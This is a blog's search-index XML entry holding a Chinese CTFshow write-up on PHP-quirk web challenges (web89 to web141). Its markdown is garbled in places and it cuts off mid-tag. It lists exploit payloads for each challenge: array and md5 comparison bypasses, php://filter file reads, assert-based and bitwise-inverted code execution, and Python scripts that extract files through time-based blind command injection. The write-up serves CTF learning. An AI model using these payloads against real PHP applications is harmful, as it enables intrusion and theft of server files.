<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTF_show_Web入门_php特性</title>
    <link href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><ul><li><p>intval函数：如果他的值为一个数组，只要数组里有值，不论数量，返回1，空数组返回0</p></li><li><p>preg_match()函数可以用数组绕过</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?num[]&#x3D;1</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web90<br><br>- 进制绕过<br><br>- ```<br>  /?num=<span class="hljs-number">010574</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><ul><li><p>m的意思是多行匹配</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?cmd&#x3D;%0aphp</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web92<br><br>- ```<br>  /?num=<span class="hljs-number">0x117c</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;010574<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web94<br><br>- ```<br>  /?num=<span class="hljs-number">4476.0</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?num&#x3D;+010574<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web96</span><br><br>- ```<br>  <span class="hljs-regexp">/?u=./</span>flag.php<br></code></pre></td></tr></table></figure></li></ul><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><ul><li>&#96;&#96;&#96;<br>a[]&#x3D;1&amp;b[]&#x3D;2<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web98<br><br>- ```<br>  GET值随便传<br>  POST：HTTP_FlAG=flag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><ul><li><p>array_push()向数组尾部插入一个或多个元素</p></li><li><p>file_put_contents() 写入函数</p></li><li><pre><code class="hljs">GET:n=1.phpPOST:content=&lt;?=`tac f*`;多试几次<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br><span class="hljs-comment">### web100</span><br><br>- =的优先级高于<span class="hljs-keyword">and</span><br>- 所以只要<span class="hljs-built_in">v1</span>为true就行<br><br>- ```<br>  /?<span class="hljs-built_in">v1</span><span class="hljs-number">=1</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=var_dump</span>($ctfshow)&amp;<span class="hljs-built_in">v3</span>=<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>flag中把0x2d换成-</p></li></ul><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><ul><li><p>反射</p></li><li><pre><code class="hljs">/?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br>- 最后一位爆破<br><br><span class="hljs-meta">### web102～103</span><br><br>- ```<br><span class="hljs-symbol">  GET:</span>/?v2=<span class="hljs-number">115044383959474e6864434171594473</span><span class="hljs-variable">&amp;v3</span>=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=2.php</span><br><span class="hljs-symbol">  POST:</span>v1=hex2bin<br></code></pre></td></tr></table></figure></code></pre></li><li><p>然后访问2.php查看源码</p></li><li><p>hex2bin就是把十六进制值的字符串转换为ASCII字符</p></li></ul><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><ul><li>&#96;&#96;&#96;<br>GET:v2[]&#x3D;1<br>POST:v1[]&#x3D;1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web105</span><br><br>- ```<br>  GET:<span class="hljs-attribute">suces</span>=flag<br>  POST:<span class="hljs-attribute">error</span>=suces<br></code></pre></td></tr></table></figure></li></ul><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><ul><li><pre><code class="hljs">GET:v2[]=1POST:v1[]=2<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">### web107</span><br><br>- ```<br>  GET:<span class="hljs-attribute">v3</span>=240610708<br>  POST:<span class="hljs-attribute">v1</span>=flag=0<br></code></pre></td></tr></table></figure></code></pre></li><li><p>解释一下：240610708经过md5加密后是0e462…..</p></li><li><p>因为是弱类比较所以0&#x3D;&#x3D;0e</p></li></ul><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><ul><li><p>ereg函数的功能是用指定的模式搜索一个字符长中指定的字符串，如果匹配成功就返回true。大小敏感。<strong>但是存在NULL漏洞</strong>，导致了正则过滤被绕过，所以可以使用%00截断正则匹配</p></li><li><p>strrev函数就是返还反转后的字符串</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?c&#x3D;a%00778</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web109<br><br>- Exception是所以异常的基类<br><br>- ```<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>  /?v1=exception&amp;v2=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><ul><li><p>FilesystemIterator 遍历文件类</p></li><li><p>getcwd 取得当前工作目录</p></li><li><p>组合在一起默认只显示第一个文件</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- 访问fl36dga.txt<br><br>### web111<br><br>- ```<br>  v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure></li></ul><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web113<br><br>- ```<br>  /?file=compress.zlib:<span class="hljs-comment">//flag.php</span><br>  读取压缩流<br></code></pre></td></tr></table></figure></li></ul><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><ul><li><pre><code class="hljs">/?file=php://filter/resource=flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web115</span><br><br>- 需要满足条件：<br>  - 通过is_numeric的检测<br>  - 不等于<span class="hljs-number">36</span><br>  - 去空后依旧不等于<span class="hljs-number">36</span><br>  - 经过过滤方法后等于<span class="hljs-number">36</span><br><br>- fluzz脚本<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">129</span>;<span class="hljs-variable">$i</span>++)&#123;<br>  <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&#x27;36&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span>&amp;&amp;<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br>  &#125;<br>  &#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>%0C36</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><br>### web123<br><br>- php特性：在php中变量是由数字和下划线组成的，所以不论用post还是<span class="hljs-keyword">get</span>传入变量参数的时候都将空格、+、点、[转换为下划线，但是使用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，例：CTF[SHOW.COM ===&gt; CTF_SHOW.COM<br><br>- ```<br>  POST:CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=echo $flag</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><ul><li><pre><code class="hljs">POST:CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])GET:1=flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web126</span><br><br>```php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>先给payload</p></li><li><p>&#96;&#96;&#96;<br>GET:$fl0g&#x3D;flag_give_me<br>POST:CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;assert($a[0])</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>- 解释一下：<br><br>  - GET传参中传的是<span class="hljs-variable">$fl0g</span>不是fl0g所以可以绕过isset<br><br>  - assert断言函数，如果里面传字符串，会被当作PHP代码执行<br><br>  - ```<br>    <span class="hljs-variable">$a</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;argv&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]</span>=&gt;<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure><ul><li><p>&#96;&#96;&#96;<br>$_SERVER[‘argv’]：</p><p>1、cli模式（命令行）下</p><pre><code class="hljs">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</code></pre><p>2、web网页模式下</p><pre><code class="hljs">在web页模式下必须在php.ini开启register_argc_argv配置项设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]$argv,$argc在web模式下不适用</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web127<br><br>- ```<br>  /?ctf show=ilove36d<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><ul><li>&#96;&#96;&#96;<br>call_user_func:把第一个参数当作回掉函数用<br>知识点：_()是一个函数<br>_()&#x3D;&#x3D;gettext()是gettext()的扩展函数，开启text扩展，需要php扩展目录下有php_gettext.dll<br>get_defined_vars():返回由所有已定义变量组成的数组<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  /?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">### web130</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">数组绕过</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST</span><span class="hljs-punctuation">:</span> <span class="hljs-string">f[]=666</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><ul><li><p>不知道为什么这次不能数组绕过了</p></li><li><p>回溯次数限制绕过</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>url&#x3D;”<a href="http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;">http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;</a><br>data&#x3D;{<br>‘f’:’very’*250000+’36Dctfshow’<br>}<br>r&#x3D;requests.post(url,data&#x3D;data)<br>print(r.text)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web132<br><br>- 访问robots<br><br>- 访问admin<br><br>- ```<br>  /?username=admin&amp;password=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">code</span>=admin<br></code></pre></td></tr></table></figure></li></ul><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><ul><li><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></li><li>长见识</li></ul><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><ul><li><p>&#96;&#96;&#96;<br>parse_str()–将字符串解析成多个变量；如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域</p><p>extract()–从数组中将变量导入到当前的符号表，将键名当作变量名，值作为变量的值（默认覆盖）</p><p>注意两个的区别：</p><p>extract是将数组中元素分解,执行后数组的key值作为变量名，数组的value赋值给对应Key的变量，这样可以直接通过Key变量去访问，不用数组加key去访问。</p><p>即：从数组中创建变量</p><p>parse_str是根据”&#x3D;”来分解字符串，主要用于对url参数的解析。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  /?_POST[key1]=<span class="hljs-number">36</span>d&amp;_POST[key2]=<span class="hljs-number">36</span>d<br></code></pre></td></tr></table></figure></li></ul><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?F&#x3D;<code>$F</code> ;cp flag.php 666.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web136</span><br><br>- ```<br>  ?c=<span class="hljs-built_in">ls</span> \|<span class="hljs-built_in">tee</span> 1<br>  //将根目录下的内容写入1<br>  访问1，下载文件发现f149_15_h3r3<br>  ?c=<span class="hljs-built_in">nl</span> /f149_15_h3r3|<span class="hljs-built_in">tee</span> 1<br>  访问1，下载文件得flag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><ul><li>&#96;&#96;&#96;<br>POST:ctfshow&#x3D;ctfshow::getFlag<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web138<br><br>- ```<br>  POST:ctfshow[<span class="hljs-number">0</span>]=ctfshow&amp;ctfshow[<span class="hljs-number">1</span>]=getFlag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><ul><li><p>获取文件名脚本</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>import time<br>import string<br>str&#x3D;string.ascii_letters+string.digits#生成所有字母与数字[a-zA-Z0-9]<br>result&#x3D;””<br>for i in range(1,5):<br>key&#x3D;0<br>for j in range(1,15):<br>    if key&#x3D;&#x3D;1:<br>        break<br>    for n in str:<br>        payload&#x3D;”if [ <code>ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;</code> &#x3D;&#x3D; {2} ];then sleep 3;fi”.format(i,j,n)<br>        #print(payload)<br>        url&#x3D;”<a href="http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload">http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload</a><br>        try:<br>            requests.get(url,timeout&#x3D;(2.5,2.5))<br>        except:<br>            result&#x3D;result+n<br>            print(result)<br>            break<br>        if n&#x3D;&#x3D;’9’:<br>            key&#x3D;1<br>result+&#x3D;” “</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- 读取文件内容脚本<br><br>- ```python<br>  import requests<br>  import time<br>  import string<br>  <span class="hljs-attribute">str</span>=string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字<br>  <span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attribute">key</span>=0<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,45):<br>  <span class="hljs-built_in">print</span>(j)<br>  <span class="hljs-keyword">if</span> <span class="hljs-attribute">key</span>==1:<br>  break<br>  <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br>  <span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)<br>  #<span class="hljs-built_in">print</span>(payload)<br>  <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;</span>+payload<br>  try:<br>  requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))#time()第一个参数是响应时间，第二个是读取时间<br>  except:<br>      <span class="hljs-attribute">result</span>=result+n<br>      <span class="hljs-built_in">print</span>(result)<br>      break<br></code></pre></td></tr></table></figure></li></ul><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>题目分析：要求我们输入f1和f2必须是小写字母和数字的组成</p></li><li><p>&#96;&#96;&#96;<br>0和字符串进行弱比较的时候返回的就是true，因为比较时会先将字符串类型转化成相同，再比较，<br>所以只要intval（$code）为0<br>所以code是字符串就行</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  POST：<span class="hljs-built_in">f1</span><span class="hljs-symbol">=md5</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=md5</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><ul><li><pre><code class="hljs">正则匹配：\w :匹配字母数字下划线\W :非字母数字下划线<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>- ```<br>  绕过return的方式：<br>  php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <span class="hljs-number">1</span><span class="hljs-built_in">-phpinfo</span>();结合减号是可以执行<span class="hljs-built_in">phpinfo</span>()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>system(tac f*);<br>经过取反处理<br>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);<br>payload：<br>?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);-&amp;v2&#x3D;1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 